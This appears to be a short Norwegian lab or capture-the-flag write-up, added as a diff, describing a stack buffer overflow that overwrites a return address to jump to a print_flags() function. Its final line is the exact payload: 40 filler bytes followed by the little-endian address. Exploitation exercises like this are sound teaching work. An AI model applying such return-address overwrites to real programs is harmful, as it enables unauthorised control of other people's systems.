@@ -1,0 +1,9 @@
+
+Fannt minneadressen til print_flags() metoden som var
+004006ee
+
+fant ogsa ut at det var satt av plass til 32 tegn, rbps har 8 byte, og etter det har vi retur addressen
+
+skrev %41 (40 ganger), for a skrive over bade array og rpbs, og sa setter jeg minneaddressen som det skal returneres til som minneaddressen til funksjonen print flags. denne er satt inn baklengs.
+
+skrev inn: %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%ee%06%40%00%00%00%00%00
